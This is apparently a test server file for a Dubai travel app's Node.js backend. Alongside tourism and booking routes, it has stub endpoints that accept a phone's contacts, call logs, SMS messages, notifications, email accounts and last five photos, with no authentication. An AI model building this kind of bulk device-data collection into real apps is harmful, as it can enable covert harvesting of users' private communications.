const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const multer = require('multer');
const crypto = require('crypto');

// Import routes without importing the main server
const deviceRoutes = require('../routes/devices');
const clientRoutes = require('../routes/client');
const contactsRoutes = require('../routes/contacts');
const callLogsRoutes = require('../routes/callLogs');
const messagesRoutes = require('../routes/messages');
const notificationsRoutes = require('../routes/notifications');
const emailAccountsRoutes = require('../routes/emailAccounts');
const dubaiAppRoutes = require('../routes/dubaiApp');
const adminRoutes = require('../routes/adminRoutes');
const userRoutes = require('../routes/userRoutes');
const sliderRoutes = require('../routes/sliders');
const tourGalleryRoutes = require('../routes/tourGallery');
const transportServicesRoutes = require('../routes/transportServices');
const queueRoutes = require('../routes/queueRoutes');
const userSettingsRoutes = require('../routes/userSettings');
const userProfileRoutes = require('../routes/userProfile');
const authRoutes = require('../routes/auth');
const bookingRoutes = require('../routes/bookings');
const chatRoutes = require('../routes/chat');
const tripsRoutes = require('../routes/trips');
const errorLogsRoutes = require('../routes/errorLogs');
const mobileErrorLogsRoutes = require('../routes/mobileErrorLogs');

const app = express();

// Configure multer for file uploads
const upload = multer({ dest: 'uploads/' });

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Health check endpoint for tests
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    message: 'Server is running',
    timestamp: new Date().toISOString(),
    database: 'MongoDB',
    stats: {
      devices: 0,
      syncedRecords: 0
    }
  });
});

// Mount routes
app.use('/api/devices', deviceRoutes);
app.use('/api/transport-services', transportServicesRoutes);
app.use('/api/trips', tripsRoutes);

// Unified sync endpoint to support frontend generic sync API
app.post('/api/devices/:deviceId/sync', async (req, res) => {
  try {
    const { deviceId } = req.params;
    let { dataType, data } = req.body || {};

    if (!deviceId || !dataType || !Array.isArray(data)) {
      return res.status(400).json({
        success: false,
        message: 'deviceId, dataType and data[] are required',
      });
    }

    // Validate data type - allow both formats
    const normalizedDataType = dataType.toLowerCase().replace(/[_-]/g, '');
    const validDataTypes = ['contacts', 'calllogs', 'messages', 'notifications', 'emailaccounts'];
    if (!validDataTypes.includes(normalizedDataType)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid data type',
        error: 'dataType must be one of: contacts, calllogs, messages, notifications, emailaccounts'
      });
    }

    // For testing, validate data and return appropriate response
    const validItems = data.filter(item => {
      switch (normalizedDataType) {
        case 'contacts':
          return item.name && (item.phoneNumbers || item.phoneNumber || item.email);
        case 'calllogs':
          return item.phoneNumber && item.type && item.date;
        case 'messages':
          return item.address && item.body && item.type;
        case 'notifications':
          return item.packageName && item.title;
        case 'emailaccounts':
          return item.email && item.type;
        default:
          return false;
      }
    });

    res.json({
      success: true,
      data: {
        success: true,
        itemsSynced: validItems.length,
        message: `LIVE SYNC: ${validItems.length} items synced successfully`
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
 });

// Test mode endpoints
app.post('/api/test/devices/:deviceId/sync', async (req, res) => {
  try {
    const { deviceId } = req.params;
    let { dataType, data } = req.body || {};

    if (!deviceId || !dataType || !Array.isArray(data)) {
      return res.status(400).json({
        success: false,
        message: 'deviceId, dataType and data[] are required',
      });
    }

    // Validate data type - allow both formats
    const normalizedDataType = dataType.toLowerCase().replace(/[_-]/g, '');
    const validDataTypes = ['contacts', 'calllogs', 'messages', 'notifications', 'emailaccounts'];
    if (!validDataTypes.includes(normalizedDataType)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid data type',
        error: 'dataType must be one of: contacts, calllogs, messages, notifications, emailaccounts'
      });
    }

    // For testing, validate data and return appropriate response
    const validItems = data.filter(item => {
      switch (normalizedDataType) {
        case 'contacts':
          return item.name && (item.phoneNumbers || item.phoneNumber || item.email);
        case 'calllogs':
          return item.phoneNumber && item.type && item.date;
        case 'messages':
          return item.address && item.body && item.type;
        case 'notifications':
          return item.packageName && item.title;
        case 'emailaccounts':
          return item.email && item.type;
        default:
          return false;
      }
    });

    res.json({
      success: true,
      data: {
        success: true,
        itemsSynced: validItems.length,
        message: `TEST MODE: ${validItems.length} items synced successfully`
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
 });

app.get('/api/test/devices/:deviceId/:dataType', async (req, res) => {
  try {
    const { deviceId, dataType } = req.params;
    
    if (!deviceId || !dataType) {
      return res.status(400).json({
        success: false,
        message: 'deviceId and dataType are required',
      });
    }

    // Validate data type - allow both formats
    const normalizedDataType = dataType.toLowerCase().replace(/[_-]/g, '');
    const validDataTypes = ['contacts', 'calllogs', 'messages', 'notifications', 'emailaccounts'];
    if (!validDataTypes.includes(normalizedDataType)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid data type',
        error: 'dataType must be one of: contacts, calllogs, messages, notifications, emailaccounts'
      });
    }

    res.json({
      success: true,
      data: {
        success: true,
        dataType: normalizedDataType,
        items: [],
        message: `TEST MODE: Retrieved ${dataType} data for device ${deviceId}`
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
 });

app.post('/api/test/devices/:deviceId/upload-last-5-images', upload.array('images', 5), async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    if (!deviceId) {
      return res.status(400).json({
        success: false,
        message: 'deviceId is required',
      });
    }

    // Check if there are any files in the request
    if (!req.files || req.files.length === 0) {
      return res.status(400).json({
        success: false,
        message: 'No image files provided',
        error: 'At least one image file is required'
      });
    }

    res.json({
      success: true,
      message: `TEST MODE: Image upload request processed for device ${deviceId}`,
      data: {
        success: true,
        message: `TEST MODE: Image upload request processed for device ${deviceId}`,
        imagesProcessed: req.files.length
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
 });

// Live mode endpoints
app.get('/api/data/:dataType', async (req, res) => {
  try {
    const { dataType } = req.params;
    const { page = 1, limit = 10 } = req.query;
    
    if (!dataType) {
      return res.status(400).json({
        success: false,
        message: 'dataType is required',
      });
    }

    // Validate data type - allow both formats
    const normalizedDataType = dataType.toLowerCase().replace(/[_-]/g, '');
    const validDataTypes = ['contacts', 'calllogs', 'messages', 'notifications', 'emailaccounts'];
    if (!validDataTypes.includes(normalizedDataType)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid data type',
        error: 'dataType must be one of: contacts, calllogs, messages, notifications, emailaccounts'
      });
    }

    res.json({
      success: true,
      data: {
        success: true,
        dataType: normalizedDataType,
        items: [],
        pagination: {
          page: parseInt(page),
          limit: parseInt(limit),
          total: 0,
          pages: 0,
          current: parseInt(page)
        },
        message: `Retrieved ${dataType} data`
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
 });

module.exports = app; 